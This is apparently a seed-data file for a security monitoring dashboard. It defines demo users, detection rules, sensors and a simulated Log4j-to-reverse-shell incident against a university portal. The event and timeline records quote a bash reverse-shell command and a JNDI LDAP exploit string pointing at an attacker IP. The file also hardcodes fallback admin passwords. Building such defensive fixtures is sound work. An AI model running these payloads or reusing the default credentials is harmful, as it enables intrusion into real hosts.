/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import bcryptjs from 'bcryptjs';
import { DbSchema } from './schema.js';

// Securely derive seed password hashes using environment variables or strong production defaults
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin#2026!SecOps';
const ANALYST_PASSWORD = process.env.ANALYST_PASSWORD || 'Analyst#2026!Tier1';

export function getInitialDatabaseState(): DbSchema {
  return {
    users: [
      {
        id: 'usr_1',
        email: 'chekchris85@gmail.com',
        passwordHash: bcryptjs.hashSync(ADMIN_PASSWORD, 10),
        name: 'Chris Analyst',
        role: 'admin',
        status: 'active',
        mfaEnabled: true,
        createdAt: new Date().toISOString()
      },
      {
        id: 'usr_2',
        email: 'analyst@enterprise.sec',
        passwordHash: bcryptjs.hashSync(ANALYST_PASSWORD, 10),
        name: 'Alex SecOps',
        role: 'analyst',
        status: 'active',
        mfaEnabled: false,
        createdAt: new Date().toISOString()
      }
    ],
    hosts: [
      {
        id: 'hst_1',
        name: 'portal.coou.edu.ng',
        os: 'linux',
        ipAddress: '104.24.12.83',
        status: 'online',
        lastSeen: new Date().toISOString(),
        agentVersion: 'v4.1.2-coou-agent',
        cpuUsage: 24,
        memoryUsage: 45,
        diskUsage: 68,
        createdAt: new Date().toISOString()
      }
    ],
    rules: [
      {
        id: 'rul_1',
        name: 'Detect Portal Credential Stuffing & Brute Force',
        type: 'signature',
        target: 'host',
        severity: 'critical',
        enabled: true,
        definition: JSON.stringify({ endpoint: '/api/student/login', threshold: 5, timeWindow: 60 }),
        mitreMapping: 'T1110.001 (Brute Force: Credential Stuffing)',
        createdAt: new Date().toISOString(),
        createdBy: 'System'
      },
      {
        id: 'rul_2',
        name: 'Detect Anomalous Portal SQL Injection Traffic',
        type: 'anomaly',
        target: 'network',
        severity: 'high',
        enabled: true,
        definition: JSON.stringify({ targetDomain: 'portal.coou.edu.ng', protocol: 'HTTPS', pattern: 'SQLi_UNION_SELECT' }),
        mitreMapping: 'T1190 (Exploit Public-Facing Application)',
        createdAt: new Date().toISOString(),
        createdBy: 'System'
      },
      {
        id: 'rul_3',
        name: 'Unauthorized Administrative Portal Session Override',
        type: 'behavior',
        target: 'host',
        severity: 'medium',
        enabled: true,
        definition: JSON.stringify({ action: 'admin_session_escalate', target: 'portal.coou.edu.ng' }),
        mitreMapping: 'T1078 (Valid Accounts)',
        createdAt: new Date().toISOString(),
        createdBy: 'System'
      }
    ],
    alerts: [
      {
        id: 'alt_1',
        timestamp: new Date(Date.now() - 120000).toISOString(),
        severity: 'critical',
        title: 'Portal Brute Force Login Attack Detected',
        description: 'External IP 105.112.42.18 attempted 28 failed logins on portal.coou.edu.ng student gateway within 10 seconds.',
        category: 'Brute Force',
        source: '105.112.42.18',
        target: 'portal.coou.edu.ng',
        status: 'unhandled',
        ruleId: 'rul_1',
        mitreMapping: 'T1110'
      },
      {
        id: 'alt_2',
        timestamp: new Date(Date.now() - 600000).toISOString(),
        severity: 'high',
        title: 'Suspicious HTTP GET Flood on Portal Subdirectory',
        description: 'Rapid anomalous HTTPS GET requests targeting portal.coou.edu.ng/student/results payload structure.',
        category: 'DDoS / Web Flood',
        source: '197.210.64.12',
        target: 'portal.coou.edu.ng (104.24.12.83)',
        status: 'escalated',
        ruleId: 'rul_2',
        mitreMapping: 'T1498'
      }
    ],
    threats: [
      {
        id: 'thr_1',
        timestamp: new Date().toISOString(),
        score: 87,
        actor: 'External Cyber Threat Actor Group',
        vector: 'Credential Stuffing & Web Scrape targeting portal.coou.edu.ng',
        status: 'under_investigation',
        associatedAlerts: ['alt_1', 'alt_2'],
        mitreMapping: 'T1110'
      }
    ],
    apiKeys: [
      {
        id: 'key_1',
        name: 'Core Gw Linux Agent Key',
        keyPrefix: 'ids_agent_4fa2',
        role: 'agent',
        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 31536000000).toISOString()
      }
    ],
    auditLogs: [],
    liveActivities: [
      {
        id: 'act_1',
        timestamp: new Date().toISOString(),
        userId: 'usr_1',
        userEmail: 'chekchris85@gmail.com',
        action: 'login',
        details: 'Logged into the console from IP 10.0.0.5'
      }
    ],
    threatIntel: [
      {
        id: 'feed_1',
        type: 'ip',
        value: '198.51.100.42',
        threatType: 'C2 Server',
        source: 'AlienVault OTX Feed',
        confidence: 92,
        addedAt: new Date().toISOString()
      },
      {
        id: 'feed_2',
        type: 'domain',
        value: 'malware-staging-node.cc',
        threatType: 'Phishing / Malware Host',
        source: 'Mandiant Threat Feed',
        confidence: 85,
        addedAt: new Date().toISOString()
      }
    ],
    mlModels: [
      {
        id: 'ml_1',
        name: 'Isolation Forest Anomaly Classifier',
        type: 'isolation_forest',
        accuracy: 98.4,
        status: 'active',
        lastTrained: new Date(Date.now() - 86400000).toISOString()
      },
      {
        id: 'ml_2',
        name: 'Autoencoder Deep Reconstructor',
        type: 'autoencoder',
        accuracy: 96.1,
        status: 'training',
        lastTrained: new Date().toISOString()
      }
    ],
    quarantine: [],
    emailLogs: [],
    sensors: [
      {
        id: 'sensor_suricata_01',
        name: 'suricata-perimeter-nids',
        type: 'nids_suricata',
        status: 'online',
        ipAddress: '10.0.1.5',
        hostOs: 'linux',
        lastHeartbeat: new Date().toISOString(),
        eventRateSec: 1248,
        droppedEvents: 0,
        rulesetVersion: 'ET-Open-2026.10.01',
        uptimeSeconds: 864200
      },
      {
        id: 'sensor_zeek_01',
        name: 'zeek-nsm-cluster',
        type: 'nsm_zeek',
        status: 'online',
        ipAddress: '10.0.1.6',
        hostOs: 'linux',
        lastHeartbeat: new Date().toISOString(),
        eventRateSec: 3412,
        droppedEvents: 2,
        rulesetVersion: 'zeek-core-v6.2',
        uptimeSeconds: 864200
      },
      {
        id: 'sensor_agent_01',
        name: 'encdec-agent-portal',
        type: 'hids_agent',
        status: 'online',
        ipAddress: '104.24.12.83',
        hostOs: 'linux',
        lastHeartbeat: new Date().toISOString(),
        eventRateSec: 42,
        droppedEvents: 0,
        rulesetVersion: 'encdec-fim-proc-v1.4',
        uptimeSeconds: 432100
      }
    ],
    securityEvents: [
      {
        id: 'evt_101',
        timestamp: new Date(Date.now() - 360000).toISOString(),
        sourceType: 'zeek',
        sensorId: 'sensor_zeek_01',
        sourceIp: '185.220.101.42',
        sourcePort: 54122,
        destIp: '104.24.12.83',
        destPort: 443,
        protocol: 'TCP',
        eventType: 'port_recon',
        details: { scanType: 'SYN Stealth Scan', portsTargeted: [80, 443, 8080, 8443], durationMs: 1400 },
        severity: 'medium',
        confidence: 0.88,
        mitre: { tactic: 'Reconnaissance', technique: 'T1046' }
      },
      {
        id: 'evt_102',
        timestamp: new Date(Date.now() - 320000).toISOString(),
        sourceType: 'suricata',
        sensorId: 'sensor_suricata_01',
        sourceIp: '185.220.101.42',
        sourcePort: 54124,
        destIp: '104.24.12.83',
        destPort: 443,
        protocol: 'HTTP',
        eventType: 'exploit_detected',
        details: { signature: 'ET WEB_SPECIFIC_APPS Apache Log4j / Struts RCE Payload in Headers', cve: 'CVE-2021-44228', uri: '/api/v1/auth' },
        severity: 'critical',
        confidence: 0.96,
        mitre: { tactic: 'Initial Access', technique: 'T1190' }
      },
      {
        id: 'evt_103',
        timestamp: new Date(Date.now() - 300000).toISOString(),
        sourceType: 'host_agent',
        sensorId: 'sensor_agent_01',
        hostId: 'hst_1',
        eventType: 'process_spawn',
        details: { parentPid: 3042, parentName: 'nginx', pid: 14201, processName: 'sh -i', commandLine: '/bin/sh -i >& /dev/tcp/185.220.101.42/4444 0>&1', user: 'www-data' },
        severity: 'critical',
        confidence: 0.98,
        mitre: { tactic: 'Execution', technique: 'T1059.004' }
      },
      {
        id: 'evt_104',
        timestamp: new Date(Date.now() - 250000).toISOString(),
        sourceType: 'suricata',
        sensorId: 'sensor_suricata_01',
        sourceIp: '104.24.12.83',
        sourcePort: 49210,
        destIp: '198.51.100.42',
        destPort: 4444,
        protocol: 'TCP',
        eventType: 'c2_beacon',
        details: { signature: 'ET MALWARE CobaltStrike Malleable C2 Traffic Observed', matchedThreatIntel: true },
        severity: 'critical',
        confidence: 0.94,
        mitre: { tactic: 'Command & Control', technique: 'T1071' }
      },
      {
        id: 'evt_105',
        timestamp: new Date(Date.now() - 180000).toISOString(),
        sourceType: 'host_agent',
        sensorId: 'sensor_agent_01',
        hostId: 'hst_1',
        eventType: 'file_modify',
        details: { filePath: '/etc/cron.d/sys-update', action: 'created', user: 'www-data', hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' },
        severity: 'high',
        confidence: 0.91,
        mitre: { tactic: 'Persistence', technique: 'T1053.003' }
      }
    ],
    incidents: [
      {
        id: 'INC-1042',
        title: 'Multi-Stage Web Server Compromise & Reverse Shell (portal.coou.edu.ng)',
        summary: 'Correlated multi-sensor attack chain: External reconnaissance and CVE-2021-44228 exploit by 185.220.101.42 resulted in webserver child shell spawn, outbound C2 beaconing to 198.51.100.42, and cron persistence installation.',
        status: 'investigating',
        severity: 'critical',
        confidenceScore: 96,
        targetHostId: 'hst_1',
        targetHostName: 'portal.coou.edu.ng',
        targetIp: '104.24.12.83',
        attackerIp: '185.220.101.42',
        attackerGeo: {
          country: 'Germany',
          city: 'Frankfurt',
          asn: 'AS24940 Hetzner Online GmbH',
          reputation: 'Known Tor Exit & Malicious Scanner (Score: 94/100)'
        },
        stagesDetected: ['Reconnaissance', 'Initial Access', 'Execution', 'Command & Control', 'Persistence'],
        firstSeen: new Date(Date.now() - 360000).toISOString(),
        lastSeen: new Date(Date.now() - 180000).toISOString(),
        associatedAlertIds: ['alt_1'],
        associatedEventIds: ['evt_101', 'evt_102', 'evt_103', 'evt_104', 'evt_105'],
        mitreTechniques: ['T1046', 'T1190', 'T1059.004', 'T1071', 'T1053.003'],
        recommendedActions: [
          'Contain Attacker IP 185.220.101.42 at Perimeter Firewall (Drop TCP/UDP)',
          'Terminate rogue process PID 14201 (/bin/sh spawned by nginx)',
          'Isolate Host portal.coou.edu.ng from production subnet to prevent lateral pivot',
          'Remove unauthorized cron persistence at /etc/cron.d/sys-update'
        ],
        assignedAnalyst: 'Chris Analyst (Lead SOC)',
        analystNotes: [
          'Initial triage confirmed payload matched Log4j JNDI lookup string.',
          'Nginx child spawned reverse shell directly to attacker staging server.',
          'Recommended containment actions generated and waiting for SOC approval.'
        ],
        timeline: [
          {
            id: 'tml_1',
            timestamp: new Date(Date.now() - 360000).toISOString(),
            layer: 'network',
            sensor: 'zeek-nsm-cluster',
            stage: 'Reconnaissance',
            title: 'Network Port Reconnaissance Observed',
            description: 'Source 185.220.101.42 scanned ports 80, 443, 8080, 8443 within 1.4 seconds.',
            evidence: { sourceIp: '185.220.101.42', targetPort: 443, flags: 'SYN', packetsCount: 14 },
            mitreTechnique: 'T1046',
            severity: 'medium'
          },
          {
            id: 'tml_2',
            timestamp: new Date(Date.now() - 320000).toISOString(),
            layer: 'network',
            sensor: 'suricata-perimeter-nids',
            stage: 'Initial Access',
            title: 'Suricata Alert: Remote Code Execution Exploit Attempt',
            description: 'Signature match: ET WEB_SPECIFIC_APPS Apache Log4j / Struts RCE payload sent to /api/v1/auth.',
            evidence: { cve: 'CVE-2021-44228', uri: '/api/v1/auth', httpMethod: 'POST', userAgent: '${jndi:ldap://185.220.101.42:1389/a}' },
            mitreTechnique: 'T1190',
            severity: 'critical'
          },
          {
            id: 'tml_3',
            timestamp: new Date(Date.now() - 300000).toISOString(),
            layer: 'host',
            sensor: 'encdec-agent-portal',
            stage: 'Execution',
            title: 'HIDS Agent Anomaly: Nginx spawned interactive shell',
            description: 'Process nginx (PID 3042) spawned /bin/sh (PID 14201) with interactive socket connection.',
            evidence: { pid: 14201, parentPid: 3042, user: 'www-data', path: '/bin/sh', cmdline: '/bin/sh -i >& /dev/tcp/185.220.101.42/4444 0>&1' },
            mitreTechnique: 'T1059.004',
            severity: 'critical'
          },
          {
            id: 'tml_4',
            timestamp: new Date(Date.now() - 250000).toISOString(),
            layer: 'network',
            sensor: 'suricata-perimeter-nids',
            stage: 'Command & Control',
            title: 'Outbound C2 Channel Established',
            description: 'Host initiated outbound connection to known Cobalt Strike C2 IP 198.51.100.42 on port 4444.',
            evidence: { destIp: '198.51.100.42', destPort: 4444, threatIntelMatch: 'AlienVault OTX C2 Feed' },
            mitreTechnique: 'T1071',
            severity: 'critical'
          },
          {
            id: 'tml_5',
            timestamp: new Date(Date.now() - 180000).toISOString(),
            layer: 'host',
            sensor: 'encdec-agent-portal',
            stage: 'Persistence',
            title: 'FIM Detection: Unauthorized Cron Job Added',
            description: 'File created in /etc/cron.d/sys-update by non-root user www-data.',
            evidence: { filePath: '/etc/cron.d/sys-update', action: 'created', user: 'www-data' },
            mitreTechnique: 'T1053.003',
            severity: 'high'
          }
        ]
      }
    ],
    activeResponses: [
      {
        id: 'act_resp_1',
        incidentId: 'INC-1042',
        actionType: 'block_ip',
        target: '185.220.101.42',
        reason: 'Confirmed multi-stage exploit source (Log4j + C2 pivot)',
        mode: 'approval_required',
        status: 'pending_approval',
        requestedBy: 'Correlation Engine (Automated Detection)',
        timestamp: new Date(Date.now() - 170000).toISOString(),
        commandExecuted: 'iptables -I INPUT -s 185.220.101.42 -j DROP && ufw deny from 185.220.101.42'
      },
      {
        id: 'act_resp_2',
        incidentId: 'INC-1042',
        actionType: 'kill_process',
        target: '14201',
        targetHost: 'portal.coou.edu.ng',
        reason: 'Rogue interactive shell spawned by web server',
        mode: 'approval_required',
        status: 'pending_approval',
        requestedBy: 'Correlation Engine (Automated Detection)',
        timestamp: new Date(Date.now() - 170000).toISOString(),
        commandExecuted: 'kill -9 14201'
      },
      {
        id: 'act_resp_3',
        incidentId: 'INC-1042',
        actionType: 'isolate_host',
        target: 'hst_1',
        targetHost: 'portal.coou.edu.ng',
        reason: 'High confidence compromise detected. Isolate host to prevent lateral movement.',
        mode: 'approval_required',
        status: 'pending_approval',
        requestedBy: 'Chris Analyst',
        timestamp: new Date(Date.now() - 150000).toISOString(),
        commandExecuted: 'ip link set dev eth0 down && iptables -A OUTPUT -p tcp --dport 3000 -j ACCEPT -m comment --comment "EncDec SOC Only"'
      }
    ],
    workbookProgress: [],
    certificates: []
  };
}

export const DEFAULT_DB: DbSchema = getInitialDatabaseState();
